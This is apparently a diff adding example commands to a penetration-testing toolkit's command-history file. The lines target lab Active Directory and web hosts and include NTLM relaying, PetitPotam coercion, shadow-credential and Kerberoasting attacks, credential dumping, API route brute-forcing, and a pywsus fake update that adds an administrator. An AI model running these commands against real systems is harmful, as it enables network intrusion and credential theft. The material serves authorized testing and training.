@@ -35,7 +35,7 @@ pth-net rpc group addmem 'Domain admins' 'Shutdown' -U 'BREAKING.BAD'/'Administr
 cme smb 192.168.56.0/24 --gen-relay-list smb_targets.txt
 mitm6 --interface eth0
 mitm6 --interface eth0 --domain BREAKING.BAD
-responder --interface eth0 --NBTNSdomain --wpad --lm --ProxyAuth --ForceWpadAuth
+responder --interface eth0 --NBTNSdomain --wpad --lm --ProxyAuth
 ntlmrelayx -tf targets.txt -w -6 -smb2support -socks
 proxychains secretsdump -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
 proxychains smbexec.py -no-pass BREAKING/Administrator@SV01.BREAKING.BAD
@@ -64,6 +64,13 @@ lsassy -d BREAKING.BAD -u Administrator -k SV01.BREAKING.BAD
 masscan -v -p 1-65535 --rate=10000 -e eth0 192.168.56.0/24
 masscan -v -p 1-65535,U:1-65535 --rate=10000 -e eth0 192.168.56.0/24
 gobuster dir -w `fzf-wordlists` -u http://192.168.56.0:8000/
+kr scan hosts.txt -A=apiroutes-210328:20000 -x 5 -j 100 --fail-status-codes 400,401,404,403,501,502,426,411
+kr scan target.com -w routes.kite -A=apiroutes-210328:20000 -x 20 -j 1 --fail-status-codes 400,401,404,403,501,502,426,411
+kr brute https://target.com/subapp/ -A=aspx-210328:20000 -x 20 -j 1
+kr brute https://target.com/subapp/ -w dirsearch.txt -x 20 -j 1 -exml,asp,aspx,ashx -D
+kr scan https://target.com:8443/ -w  /opt/tools/kiterunner/routes-large.kite -A=apiroutes-210228:20000 -x 10 --ignore-length=34
+kr scan target.com -w /opt/tools/kiterunner/routes-large.kite -A=apiroutes-210228:20000 -x 10 --ignore-length=34
+kr scan targets.txt -w /opt/tools/kiterunner/routes-small.kite -A=apiroutes-210228:20000 -x 10 --ignore-length=34
 cme smb 192.168.56.0/24 -u anonymous -p anonymous --shares
 cme smb 192.168.56.0/24 -u '' -p '' --shares
 cme smb 192.168.56.0/24 -u anonymous -p anonymous --sessions
@@ -192,7 +199,7 @@ nmap -sS -n --open -p 88 192.168.56.0/24
 windapsearch --dc 192.168.56.101 --module metadata
 windapsearch --dc 192.168.56.101 --module users
 nmap --script broadcast-dhcp-discover
-SimplyEmail -all -e cybersyndicates.com 
+SimplyEmail -all -e cybersyndicates.com
 ssh-keygen -t rsa -b 4096 -f keyname
 hashcat --username --hash-type 0 --attack-mode 0 MD5_hashes.txt `fzf-wordlists`
 rbcd-permissions -c 'CN=SHUTDOWN,OU=Computers,DC=DOMAIN,DC=LOCAL' -t 'CN=SV01,OU=Computers,DC=DOMAIN,DC=LOCAL' -d BREAKING.BAD -u anonymous -p anonymous -l DC01.BREAKING.BAD
@@ -282,4 +289,19 @@ Get-GPPPassword -debug -no-pass dc01.breaking.bad
 cme smb --list-modules
 cme ldap dc01.breaking.bad -d breaking.bad -u someuser -p somepassword -M maq
 ntlmrelayx -t dcsync://dc02.breaking.bad -smb2support
+whatportis 3306
+whatportis postgresql
+cmsmap -F -d http://192.168.10.10/
+clusterd -i http://192.168.10.10/
+dirsearch -r -w /usr/share/wordlists/seclists/Discovery/Web-Content/quickhits.txt -u http://192.168.10.10/
+moodlescan -r -u http://192.168.10.10/
+pywhisker.py -v -d 'domain.local' -u 'user2' -H '126f1f9fdb9a7d9c7ba8d269728b7da0' -t 'sv01$' -a 'add' -o 'sv01'
+gettgtpkinit.py -cert-pfx 'sv01.pfx' -pfx-pass 'RLLXdD5FhNPRphSqKGg8' 'domain.local'/'sv01$' 'sv01.ccache'
+getnthash.py -key '8eb7a6388780dd52eb358769dc53ff685fd135f89c4ef55abb277d7d98995f72' 'domain.local'/'sv01$'
+petitpotam -d '' -u '' -p '' 192.168.56.1 dc01.breaking.bad
+ntlmrelayx -t ldap://dc02.breaking.bad -smb2support --remove-mic --shadow-credentials --shadow-target 'dc01$'
+targetedKerberoast.py -v -d domain.local -u user1 -p complexpassword -o kerberoastables.txt
+pass-station search tomcat
+nth --text 5f4dcc3b5aa765d61d8327deb882cf99
+pywsus.py --host 192.168.56.1 --port 8530 --executable /opt/resources/windows/sysinternals/PsExec64.exe --command '/accepteula /s cmd.exe /c "net localgroup Administrators DOMAIN\controlleduser /add"'
 # -=-=-=-=-=-=-=- YOUR COMMANDS BELOW -=-=-=-=-=-=-=- #
